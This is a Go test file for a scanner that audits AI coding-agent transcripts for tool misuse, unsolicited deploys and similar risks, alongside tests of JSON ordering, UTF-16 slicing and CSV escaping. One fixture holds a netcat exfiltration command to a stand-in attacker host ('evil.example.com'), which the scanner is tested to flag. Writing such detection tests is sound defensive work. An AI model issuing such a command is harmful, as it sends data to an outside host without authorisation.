package auditscan

import (
	"strings"
	"testing"
)

// These tests pin the behaviours that a Go port most easily gets wrong and that
// would then be invisible: key ordering, string indexing, and the arithmetic
// behind the score.

func TestArgsKeepInsertionOrder(t *testing.T) {
	// Go sorts map keys on the way out. If Args did too, the CSV `arguments`
	// column would stop matching what the npm exporter writes for the same
	// call, and people diff those.
	v, err := ParseArgsValue([]byte(`{"file_path":"/x","content":"y","a":{"z":1,"b":2}}`))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	args, ok := v.(*Args)
	if !ok {
		t.Fatal("expected an object")
	}
	want := `{"file_path":"/x","content":"y","a":{"z":1,"b":2}}`
	if got := args.String(); got != want {
		t.Errorf("order not preserved\n got: %s\nwant: %s", got, want)
	}
}

func TestArgsDuplicateKeyKeepsFirstPosition(t *testing.T) {
	v, _ := ParseArgsValue([]byte(`{"a":1,"b":2,"a":3}`))
	args := v.(*Args)
	if got, want := args.String(), `{"a":3,"b":2}`; got != want {
		t.Errorf("got %s, want %s", got, want)
	}
}

func TestStringifyLeavesHTMLAndLineSeparatorsAlone(t *testing.T) {
	// JSON.stringify escapes neither, and both appear in real tool arguments —
	// a shell redirect, and (in this repo's own guard fixtures) a U+2028.
	v, err := ParseArgsValue([]byte(`{"command":"echo <a> & \u2028 done"}`))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	got := v.(*Args).String()
	if !strings.Contains(got, "<a>") || !strings.Contains(got, "&") {
		t.Errorf("HTML characters were escaped: %s", got)
	}
	if strings.Contains(got, `\u2028`) {
		t.Errorf("line separator came out escaped, JSON.stringify emits it raw: %q", got)
	}
	if !strings.Contains(got, "\u2028") {
		t.Errorf("line separator was lost: %q", got)
	}
}

func TestStringifyKeepsEscapedBackslashBeforeU2028(t *testing.T) {
	// A value containing the six LITERAL characters \u2028 must come out as
	// \\u2028 and must NOT be turned into a real line separator. This is the
	// case a plain string replacement would corrupt.
	args := NewArgs()
	args.Set("text", `a\u2028b`)
	if got, want := args.String(), `{"text":"a\\u2028b"}`; got != want {
		t.Errorf("got %s, want %s", got, want)
	}
}

func TestJSStringIndexingIsUTF16(t *testing.T) {
	// An emoji is two UTF-16 units. Slicing by bytes would cut a transcript at
	// a different point than the npm tool does, and could split a UTF-8
	// sequence into invalid text.
	s := "ab😀cd"
	if got, want := jsLen(s), 6; got != want {
		t.Errorf("jsLen = %d, want %d", got, want)
	}
	if got, want := jsSliceHead(s, 2), "ab"; got != want {
		t.Errorf("head(2) = %q, want %q", got, want)
	}
	// Cutting mid-surrogate stops before the character rather than emitting a
	// lone surrogate Go cannot hold.
	if got, want := jsSliceHead(s, 3), "ab"; got != want {
		t.Errorf("head(3) = %q, want %q", got, want)
	}
	if got, want := jsSliceRange(s, 2, 4), "😀"; got != want {
		t.Errorf("range(2,4) = %q, want %q", got, want)
	}
}

func TestCalcScoreFloorsHalves(t *testing.T) {
	results := []CheckResult{
		{Status: StatusProtected}, {Status: StatusProtected},
		{Status: StatusPartial}, {Status: StatusPartial}, {Status: StatusPartial},
		{Status: StatusNotProtected}, {Status: StatusNotProtected},
	}
	score, fixes := CalcScore(results)
	// 2 + 1.5 = 3.5, floored to 3.
	if score != 3 {
		t.Errorf("score = %d, want 3", score)
	}
	if fixes != 2 {
		t.Errorf("fixCount = %d, want 2", fixes)
	}
}

func TestEscapeCSVQuotesOnlyWhenItHasTo(t *testing.T) {
	cases := map[string]string{
		"plain":       "plain",
		"a,b":         `"a,b"`,
		`say "hi"`:    `"say ""hi"""`,
		"line\nbreak": "\"line\nbreak\"",
	}
	for in, want := range cases {
		if got := escapeCSV(in); got != want {
			t.Errorf("escapeCSV(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestParseMillisRejectsNonsense(t *testing.T) {
	// An unparseable timestamp has to report itself as such. Treating it as the
	// epoch would put every such call before every user message and invent
	// unsolicited-action findings out of bad data.
	if _, ok := parseMillis("not a date"); ok {
		t.Error("garbage parsed as a timestamp")
	}
	if _, ok := parseMillis(""); ok {
		t.Error("empty string parsed as a timestamp")
	}
	if _, ok := parseMillis("2026-08-01T19:21:35.943Z"); !ok {
		t.Error("an ISO timestamp did not parse")
	}
}

func TestLowerPatternLiteralsLeavesEscapesAlone(t *testing.T) {
	// \S is the opposite of \s. Folding it would silently invert a pattern.
	if got, want := lowerPatternLiterals(`\Sfoo\s+BAR[A-Z]`), `\Sfoo\s+bar[a-z]`; got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

// buildSession is a small synthetic session for the check tests.
func buildSession(id string, calls ...*ToolCall) *SessionInfo {
	for _, c := range calls {
		c.SessionID = id
		if c.Arguments == nil {
			c.Arguments = NewArgs()
		}
		if c.Source == "" {
			c.Source = SourceClaude
		}
	}
	return &SessionInfo{ID: id, Source: SourceClaude, ToolCalls: calls, FilePath: "/tmp/" + id}
}

func call(name string, args map[string]string) *ToolCall {
	a := NewArgs()
	for _, k := range []string{"command", "file_path", "path", "url", "content"} {
		if v, ok := args[k]; ok {
			a.Set(k, v)
		}
	}
	return &ToolCall{ID: name, ToolName: name, Arguments: a, Timestamp: "2026-08-01T10:00:00.000Z"}
}

func TestChecksRunOnAnEmptyMachine(t *testing.T) {
	// A machine with no transcripts at all must still produce ten results.
	// Returning fewer would silently change the score's denominator.
	data := &AuditData{Sessions: nil, Sources: []string{}}
	results := RunAllChecks(data)
	if len(results) != 10 {
		t.Fatalf("got %d results, want 10", len(results))
	}
	for _, r := range results {
		if r.Code == "" || r.Status == "" || r.Summary == "" {
			t.Errorf("%s came back incomplete: %+v", r.Code, r)
		}
	}
}

func TestToolMisuseFlagsAnExfiltrationCommand(t *testing.T) {
	session := buildSession("s1",
		call("Bash", map[string]string{"command": "nc -w evil.example.com 4444"}))
	data := &AuditData{Sessions: []*SessionInfo{session}, TotalToolCalls: 1, Sources: []string{"Claude Code"}}

	result := checkToolMisuse(data, &DeepAnalysis{})
	// One exfiltration attempt is never "low frequency": the PARTIAL branch is
	// explicitly gated on there being none.
	if result.Status != StatusNotProtected {
		t.Errorf("status = %s, want NOT_PROTECTED (%s)", result.Status, result.Summary)
	}
}

func TestCodeExecutionIsProtectedWithNoShellCalls(t *testing.T) {
	session := buildSession("s1", call("Read", map[string]string{"file_path": "/etc/hosts"}))
	data := &AuditData{Sessions: []*SessionInfo{session}, TotalToolCalls: 1, Sources: []string{"Claude Code"}}

	result := checkCodeExecution(data, &DeepAnalysis{})
	if result.Status != StatusProtected {
		t.Errorf("status = %s, want PROTECTED", result.Status)
	}
}

func TestMemoryPoisoningIsNeverProtected(t *testing.T) {
	// Nothing found is PARTIAL, not PROTECTED: no scanning exists, so a clean
	// result means "not seen", not "cannot happen".
	data := &AuditData{Sessions: nil, Sources: []string{}}
	if got := checkMemoryPoisoning(data).Status; got != StatusPartial {
		t.Errorf("status = %s, want PARTIAL", got)
	}
}

func TestUnsolicitedActionNeedsAUserMessage(t *testing.T) {
	session := buildSession("s1", call("Bash", map[string]string{"command": "git push origin main"}))
	session.ToolCalls[0].Timestamp = "2026-08-01T10:05:00.000Z"

	// With no user messages there is nothing to compare against, and every
	// action would read as unsolicited.
	if got := FindUnsolicitedActions([]*SessionInfo{session}); len(got) != 0 {
		t.Errorf("got %d actions with no user messages, want 0", len(got))
	}

	session.UserMessages = []UserMessage{{Timestamp: "2026-08-01T10:00:00.000Z", Text: "fix the tests"}}
	got := FindUnsolicitedActions([]*SessionInfo{session})
	if len(got) != 1 || got[0].Action != "deploy" {
		t.Fatalf("got %+v, want one deploy", got)
	}

	// Asked for, so not unsolicited.
	session.UserMessages[0].Text = "please push this"
	if got := FindUnsolicitedActions([]*SessionInfo{session}); len(got) != 0 {
		t.Errorf("a requested push was still reported: %+v", got)
	}
}

func TestUnsolicitedActionUnderstandsTurkish(t *testing.T) {
	session := buildSession("s1", call("Bash", map[string]string{"command": "npm publish"}))
	session.ToolCalls[0].Timestamp = "2026-08-01T10:05:00.000Z"
	session.UserMessages = []UserMessage{{Timestamp: "2026-08-01T10:00:00.000Z", Text: "bunu yayınla"}}

	if got := FindUnsolicitedActions([]*SessionInfo{session}); len(got) != 0 {
		t.Errorf("a publish asked for in Turkish was reported as unsolicited: %+v", got)
	}
}
